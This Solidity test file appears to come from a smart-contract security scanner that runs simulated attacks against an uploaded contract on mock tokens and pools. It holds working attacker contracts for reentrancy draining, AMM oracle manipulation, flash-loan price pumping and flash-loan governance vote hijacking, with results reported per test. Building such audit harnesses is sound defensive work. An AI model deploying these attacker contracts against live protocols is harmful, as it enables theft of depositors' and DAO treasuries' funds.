// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/mocks/MockERC20.sol";
import "../targets/mocks/MockGovToken.sol";
import "../targets/SimpleAMM.sol";
import "../targets/FlashLender.sol";

/// @notice Dynamic reentrancy attacker that invokes custom function names
contract DynamicReentrancyAttacker {
    address public target;
    address payable public owner;
    bytes4 public depositSig;
    bytes4 public withdrawSig;

    constructor(address _target, bytes4 _depSig, bytes4 _wSig) {
        target = _target;
        owner = payable(msg.sender);
        depositSig = _depSig;
        withdrawSig = _wSig;
    }

    function attack() external payable {
        // Step 1: Deposit funds into target
        (bool depOk, ) = target.call{value: msg.value}(abi.encodeWithSelector(depositSig));
        require(depOk, "Deposit failed");

        // Step 2: Trigger initial withdrawal
        (bool wOk, ) = target.call(abi.encodeWithSelector(withdrawSig));
        require(wOk, "Initial withdraw failed");
    }

    receive() external payable {
        // Step 3: Attempt recursive withdrawal if target still holds funds
        if (target.balance >= 1 ether) {
            (bool ok, ) = target.call(abi.encodeWithSelector(withdrawSig));
            require(ok, "Reentrant withdraw blocked");
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }
}

/// @notice Helper attacker contract executing AMM spot price manipulation against lending pools
contract DynamicOracleAttacker {
    MockERC20 public immutable collateralToken;
    MockERC20 public immutable borrowToken;
    SimpleAMM public immutable amm;
    address public immutable owner;

    constructor(address _col, address _bor, address _amm) {
        collateralToken = MockERC20(_col);
        borrowToken = MockERC20(_bor);
        amm = SimpleAMM(_amm);
        owner = msg.sender;
    }

    function attack(address lendingPool) external {
        borrowToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(lendingPool, type(uint256).max);

        // Step 1: Swap 200 BOR into AMM to pump COL spot price
        uint256 colBought = amm.swap(address(borrowToken), 200 ether);

        // Step 2: Deposit 15 COL into LendingPool
        (bool depOk, ) = lendingPool.call(
            abi.encodeWithSignature("depositCollateral(uint256)", 15 ether)
        );
        require(depOk, "Deposit collateral failed");

        // Step 3: Borrow 80 BOR against inflated collateral
        (bool borrowOk, bytes memory errData) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", 80 ether)
        );
        if (!borrowOk) {
            assembly {
                revert(add(errData, 32), mload(errData))
            }
        }

        // Step 4: Swap remaining COL back to recover BOR
        if (colBought > 15 ether) {
            amm.swap(address(collateralToken), colBought - 15 ether);
        }

        borrowToken.transfer(owner, borrowToken.balanceOf(address(this)));
    }
}

/// @notice Helper attacker contract executing flash loan + oracle manipulation against lending pools
contract DynamicFlashLoanAttacker is IFlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    MockERC20 public immutable collateralToken;
    MockERC20 public immutable borrowToken;
    SimpleAMM public immutable amm;
    FlashLender public immutable flashLender;
    address public immutable owner;

    constructor(
        address _collateralToken,
        address _borrowToken,
        address _amm,
        address _flashLender
    ) {
        collateralToken = MockERC20(_collateralToken);
        borrowToken = MockERC20(_borrowToken);
        amm = SimpleAMM(_amm);
        flashLender = FlashLender(_flashLender);
        owner = msg.sender;
    }

    function executeAttack(address lendingPool, uint256 loanAmount) external {
        bytes memory data = abi.encode(lendingPool);
        flashLender.flashLoan(this, address(borrowToken), loanAmount, data);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(flashLender), "Unauthorized flash lender");
        address lendingPool = abi.decode(data, (address));

        borrowToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(lendingPool, type(uint256).max);

        // Step 1: Use 300 BOR from flash loan to pump COL spot price on AMM
        uint256 colBought = amm.swap(address(borrowToken), 300 ether);

        // Step 2: Deposit 20 COL as collateral into Lending
        (bool depOk, ) = lendingPool.call(
            abi.encodeWithSignature("depositCollateral(uint256)", 20 ether)
        );
        require(depOk, "Deposit collateral failed");

        // Step 3: Borrow 180 BOR against inflated collateral
        (bool borrowOk, bytes memory errData) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", 180 ether)
        );
        if (!borrowOk) {
            assembly {
                revert(add(errData, 32), mload(errData))
            }
        }

        // Step 4: Swap remaining COL back to BOR
        if (colBought > 20 ether) {
            amm.swap(address(collateralToken), colBought - 20 ether);
        }

        // Step 5: Repay flash loan principal + fee
        borrowToken.transfer(address(flashLender), amount + fee);

        // Step 6: Transfer net extracted profit to attacker
        borrowToken.transfer(owner, borrowToken.balanceOf(address(this)));

        return CALLBACK_SUCCESS;
    }
}

/// @notice Helper attacker contract executing flash loan vote hijacking
contract DynamicGovernanceAttacker is IFlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    MockGovToken public immutable govToken;
    FlashLender public immutable flashLender;
    address payable public immutable lootRecipient;
    string public voteFn;

    constructor(address _govToken, address _flashLender, address payable _recipient, string memory _voteFn) {
        govToken = MockGovToken(_govToken);
        flashLender = FlashLender(_flashLender);
        lootRecipient = _recipient;
        voteFn = _voteFn;
    }

    function executeAttack(address targetGov, uint256 borrowAmount) external {
        bytes memory data = abi.encode(targetGov);
        flashLender.flashLoan(this, address(govToken), borrowAmount, data);
    }

    function _executeProposalVote(address targetGov) internal {
        // Step 1: Submit proposal to drain treasury ETH to lootRecipient
        (bool propOk, bytes memory propData) = targetGov.call(
            abi.encodeWithSignature("propose(address,uint256)", lootRecipient, 10 ether)
        );
        require(propOk, "Propose failed");
        uint256 proposalId = abi.decode(propData, (uint256));

        // Step 2: Cast vote using flash-loaned voting tokens
        bool voteOk;
        bytes memory voteErr;
        if (bytes(voteFn).length > 0) {
            (voteOk, voteErr) = targetGov.call(
                abi.encodeWithSignature(string.concat(voteFn, "(uint256)"), proposalId)
            );
        }
        if (!voteOk) {
            (voteOk, voteErr) = targetGov.call(
                abi.encodeWithSignature("castVote(uint256)", proposalId)
            );
        }
        if (!voteOk) {
            (voteOk, voteErr) = targetGov.call(
                abi.encodeWithSignature("vote(uint256)", proposalId)
            );
        }
        if (!voteOk) {
            assembly {
                revert(add(voteErr, 32), mload(voteErr))
            }
        }

        // Step 3: Execute proposal immediately
        (bool execOk, bytes memory execErr) = targetGov.call(
            abi.encodeWithSignature("execute(uint256)", proposalId)
        );
        if (!execOk) {
            assembly {
                revert(add(execErr, 32), mload(execErr))
            }
        }
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(flashLender), "Unauthorized flash lender");
        address targetGov = abi.decode(data, (address));

        govToken.approve(targetGov, type(uint256).max);

        _executeProposalVote(targetGov);

        // Repay flash loan principal + fee
        govToken.transfer(address(flashLender), amount + fee);

        return CALLBACK_SUCCESS;
    }

    receive() external payable {}
}

/// @title Uploaded Contract Security Analysis Harness
/// @notice Dynamically deploys and runs atomic exploit simulations against uploaded Solidity source.
contract UploadedAnalysisTest is SentinelBase {
    function deployTargetWithArgs(string memory contractName, bytes memory args) internal returns (address) {
        string memory artifact = string.concat("contracts/targets/UploadedContract.sol:", contractName);
        if (args.length > 0) {
            return deployCode(artifact, args);
        }
        return deployCode(artifact);
    }

    function deployTargetExternal(string memory contractName, bytes memory args) external returns (address) {
        return deployTargetWithArgs(contractName, args);
    }

    function test_uploaded_reentrancy() public {
        string memory contractName = vm.envOr("TARGET_CONTRACT", string("UploadedContract"));
        string memory protocol = vm.envOr("TARGET_PROTOCOL", string("VAULT"));
        string memory depName = vm.envOr("ROLE_DEPOSIT", string("deposit"));
        string memory wName = vm.envOr("ROLE_WITHDRAW", string("withdraw"));

        if (
            keccak256(bytes(protocol)) != keccak256(bytes("VAULT")) &&
            keccak256(bytes(depName)) == keccak256(bytes(""))
        ) {
            emitSentinelResult(
                "reentrancy",
                "uploaded",
                false,
                0,
                "No vault deposit/withdraw functions mapped for reentrancy testing"
            );
            return;
        }

        address target;
        try this.deployTargetExternal(contractName, "") returns (address deployed) {
            target = deployed;
        } catch Error(string memory reason) {
            emitSentinelResult(
                "reentrancy",
                "uploaded",
                false,
                0,
                string.concat("Target deployment failed: ", reason)
            );
            return;
        } catch {
            emitSentinelResult(
                "reentrancy",
                "uploaded",
                false,
                0,
                "Target deployment reverted or missing constructor parameters"
            );
            return;
        }

        // Fund target with 10 ETH from honest user
        vm.deal(honestUser, 10 ether);
        vm.prank(honestUser);
        bytes4 depSig = bytes4(keccak256(bytes(string.concat(depName, "()"))));
        (bool funded, ) = target.call{value: 10 ether}(abi.encodeWithSelector(depSig));
        if (!funded) {
            (funded, ) = target.call{value: 10 ether}("");
        }

        if (!funded || target.balance == 0) {
            emitSentinelResult(
                "reentrancy",
                "uploaded",
                false,
                0,
                "Target could not be funded with honest liquidity"
            );
            return;
        }

        vm.deal(attacker, 1 ether);
        uint256 attackerBalBefore = attacker.balance;

        bytes4 wSig = bytes4(keccak256(bytes(string.concat(wName, "()"))));
        vm.startPrank(attacker);
        DynamicReentrancyAttacker attackContract = new DynamicReentrancyAttacker(target, depSig, wSig);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.attack{value: 1 ether}() {
            attackContract.withdrawLoot();
            uint256 attackerBalAfter = attacker.balance;
            if (attackerBalAfter > attackerBalBefore) {
                attackSucceeded = true;
                note = "drained vault via reentrant withdraw on uploaded contract";
            } else {
                note = "attack executed but extracted zero net profit";
            }
        } catch Error(string memory r) {
            note = string.concat("reentrancy blocked: ", r);
        } catch (bytes memory) {
            note = "reentrancy blocked by contract guard or state ordering";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (attacker.balance > attackerBalBefore) {
            netProfit = attacker.balance - attackerBalBefore;
        }

        emitSentinelResult("reentrancy", "uploaded", attackSucceeded, netProfit, note);
    }

    function test_uploaded_oracle() public {
        string memory protocol = vm.envOr("TARGET_PROTOCOL", string("VAULT"));
        string memory contractName = vm.envOr("TARGET_CONTRACT", string("UploadedContract"));

        if (keccak256(bytes(protocol)) != keccak256(bytes("LENDING"))) {
            emitSentinelResult(
                "oracle",
                "uploaded",
                false,
                0,
                "No lending or price-sensitive path mapped for oracle manipulation"
            );
            return;
        }

        // Setup test environment: Mock tokens and AMM pool
        MockERC20 collateralToken = new MockERC20("Collateral Token", "COL", 18);
        MockERC20 borrowToken = new MockERC20("Borrow Token", "BOR", 18);
        SimpleAMM amm = new SimpleAMM(address(collateralToken), address(borrowToken));

        // Supply AMM initial liquidity (100 COL : 100 BOR)
        collateralToken.mint(honestUser, 100 ether);
        borrowToken.mint(honestUser, 100 ether);
        vm.startPrank(honestUser);
        collateralToken.approve(address(amm), 100 ether);
        borrowToken.approve(address(amm), 100 ether);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        // Warp and establish TWAP
        vm.warp(block.timestamp + 30 minutes);
        amm.updateTWAP();

        // Deploy target: Try with (collateralToken, borrowToken, amm), then fall back to zero args
        address target;
        bytes memory lendingArgs = abi.encode(address(collateralToken), address(borrowToken), address(amm));
        try this.deployTargetExternal(contractName, lendingArgs) returns (address deployed) {
            target = deployed;
        } catch {
            try this.deployTargetExternal(contractName, "") returns (address deployedZero) {
                target = deployedZero;
            } catch {
                emitSentinelResult(
                    "oracle",
                    "uploaded",
                    false,
                    0,
                    "Target deployment failed for lending oracle test"
                );
                return;
            }
        }

        // Supply 100 BOR lending liquidity from honest user
        borrowToken.mint(honestUser, 100 ether);
        vm.startPrank(honestUser);
        borrowToken.approve(target, 100 ether);
        (bool supplyOk, ) = target.call(
            abi.encodeWithSignature("supplyBorrowLiquidity(uint256)", 100 ether)
        );
        if (!supplyOk) {
            target.call(abi.encodeWithSignature("deposit(uint256)", 100 ether));
        }
        vm.stopPrank();

        // Attacker attempts AMM spot price manipulation
        borrowToken.mint(attacker, 300 ether);
        uint256 attackerBorBefore = borrowToken.balanceOf(attacker);

        vm.startPrank(attacker);
        DynamicOracleAttacker attackContract = new DynamicOracleAttacker(
            address(collateralToken),
            address(borrowToken),
            address(amm)
        );
        borrowToken.transfer(address(attackContract), 300 ether);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.attack(target) {
            uint256 attackerBorAfter = borrowToken.balanceOf(attacker);
            if (attackerBorAfter > attackerBorBefore) {
                attackSucceeded = true;
                note = "drained lending pool via manipulated AMM spot price";
            } else {
                note = "oracle attack executed but extracted zero net profit";
            }
        } catch Error(string memory reason) {
            note = string.concat("oracle manipulation blocked: ", reason);
        } catch {
            note = "oracle manipulation blocked by price deviation check or TWAP guard";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (borrowToken.balanceOf(attacker) > attackerBorBefore) {
            netProfit = borrowToken.balanceOf(attacker) - attackerBorBefore;
        }

        emitSentinelResult("oracle", "uploaded", attackSucceeded, netProfit, note);
    }

    function test_uploaded_flash_loan() public {
        string memory protocol = vm.envOr("TARGET_PROTOCOL", string("VAULT"));
        string memory contractName = vm.envOr("TARGET_CONTRACT", string("UploadedContract"));

        if (keccak256(bytes(protocol)) != keccak256(bytes("LENDING"))) {
            emitSentinelResult(
                "flash_loan",
                "uploaded",
                false,
                0,
                "No lending or price-sensitive path mapped for flash loan testing"
            );
            return;
        }

        // Setup test environment: Mock tokens, AMM, and FlashLender
        MockERC20 collateralToken = new MockERC20("Collateral Token", "COL", 18);
        MockERC20 borrowToken = new MockERC20("Borrow Token", "BOR", 18);
        SimpleAMM amm = new SimpleAMM(address(collateralToken), address(borrowToken));
        FlashLender flashLender = new FlashLender();

        // Supply AMM initial liquidity (100 COL : 100 BOR)
        collateralToken.mint(honestUser, 100 ether);
        borrowToken.mint(honestUser, 100 ether);
        vm.startPrank(honestUser);
        collateralToken.approve(address(amm), 100 ether);
        borrowToken.approve(address(amm), 100 ether);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        // Warp and establish TWAP
        vm.warp(block.timestamp + 30 minutes);
        amm.updateTWAP();

        // Supply flash lender with 1,000 BOR
        borrowToken.mint(address(flashLender), 1000 ether);

        // Deploy target: Try with (collateralToken, borrowToken, amm), then fall back to zero args
        address target;
        bytes memory lendingArgs = abi.encode(address(collateralToken), address(borrowToken), address(amm));
        try this.deployTargetExternal(contractName, lendingArgs) returns (address deployed) {
            target = deployed;
        } catch {
            try this.deployTargetExternal(contractName, "") returns (address deployedZero) {
                target = deployedZero;
            } catch {
                emitSentinelResult(
                    "flash_loan",
                    "uploaded",
                    false,
                    0,
                    "Target deployment failed for flash loan test"
                );
                return;
            }
        }

        // Supply 250 BOR lending liquidity from honest user
        borrowToken.mint(honestUser, 250 ether);
        vm.startPrank(honestUser);
        borrowToken.approve(target, 250 ether);
        (bool supplyOk, ) = target.call(
            abi.encodeWithSignature("supplyBorrowLiquidity(uint256)", 250 ether)
        );
        if (!supplyOk) {
            (supplyOk, ) = target.call(abi.encodeWithSignature("deposit(uint256)", 250 ether));
        }
        vm.stopPrank();

        // Attacker executes flash loan exploit
        borrowToken.mint(attacker, 500 ether);
        uint256 attackerBorBefore = borrowToken.balanceOf(attacker);

        vm.startPrank(attacker);
        DynamicFlashLoanAttacker attackContract = new DynamicFlashLoanAttacker(
            address(collateralToken),
            address(borrowToken),
            address(amm),
            address(flashLender)
        );
        borrowToken.transfer(address(attackContract), 500 ether);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.executeAttack(target, 500 ether) {
            uint256 attackerBorAfter = borrowToken.balanceOf(attacker);
            if (attackerBorAfter > attackerBorBefore) {
                attackSucceeded = true;
                note = "drained lending pool via flash loan AMM pump and repaid lender";
            } else {
                note = "flash loan completed but extracted zero net profit";
            }
        } catch Error(string memory reason) {
            note = string.concat("flash loan exploit blocked: ", reason);
        } catch {
            note = "flash loan exploit blocked by lending circuit breaker or TWAP guard";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (borrowToken.balanceOf(attacker) > attackerBorBefore) {
            netProfit = borrowToken.balanceOf(attacker) - attackerBorBefore;
        }

        emitSentinelResult("flash_loan", "uploaded", attackSucceeded, netProfit, note);
    }

    function test_uploaded_governance() public {
        string memory protocol = vm.envOr("TARGET_PROTOCOL", string("VAULT"));
        string memory contractName = vm.envOr("TARGET_CONTRACT", string("UploadedContract"));
        string memory voteFn = vm.envOr("ROLE_VOTE", string("castVote"));

        if (keccak256(bytes(protocol)) != keccak256(bytes("GOVERNANCE"))) {
            emitSentinelResult(
                "governance",
                "uploaded",
                false,
                0,
                "No governance role or voting power mapped for proposal hijacking"
            );
            return;
        }

        // Setup test environment: Historical blocks, GovToken, and FlashLender
        vm.roll(100);
        MockGovToken govToken = new MockGovToken("Sentinel Governance Token", "SGT");
        FlashLender flashLender = new FlashLender();

        // Honest DAO participants hold 50,000 SGT minted at block 50
        vm.roll(50);
        govToken.mint(honestUser, 50_000 ether);
        govToken.mint(address(flashLender), 150_000 ether);
        vm.roll(100);

        // Deploy target: Try with (govToken), then fall back to zero args
        address target;
        bytes memory govArgs = abi.encode(address(govToken));
        try this.deployTargetExternal(contractName, govArgs) returns (address deployed) {
            target = deployed;
        } catch {
            try this.deployTargetExternal(contractName, "") returns (address deployedZero) {
                target = deployedZero;
            } catch {
                emitSentinelResult(
                    "governance",
                    "uploaded",
                    false,
                    0,
                    "Target deployment failed for governance test"
                );
                return;
            }
        }

        // Fund target with 10 ETH DAO treasury
        vm.deal(target, 10 ether);

        // Attacker attempts flash-loan vote hijacking
        vm.deal(attacker, 0 ether);
        govToken.mint(attacker, 500 ether); // buffer for flash loan fee
        uint256 attackerEthBefore = attacker.balance;

        vm.startPrank(attacker);
        DynamicGovernanceAttacker attackContract = new DynamicGovernanceAttacker(
            address(govToken),
            address(flashLender),
            attacker,
            voteFn
        );
        govToken.transfer(address(attackContract), 500 ether);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.executeAttack(target, 120_000 ether) {
            uint256 attackerEthAfter = attacker.balance;
            if (attackerEthAfter > attackerEthBefore) {
                attackSucceeded = true;
                note = "hijacked vote with flash-loaned balance and drained treasury";
            } else {
                note = "vote passed but treasury was not drained";
            }
        } catch Error(string memory reason) {
            note = string.concat("governance takeover blocked: ", reason);
        } catch {
            note = "governance takeover blocked by historical snapshot check";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (attacker.balance > attackerEthBefore) {
            netProfit = attacker.balance - attackerEthBefore;
        }

        emitSentinelResult("governance", "uploaded", attackSucceeded, netProfit, note);
    }
}
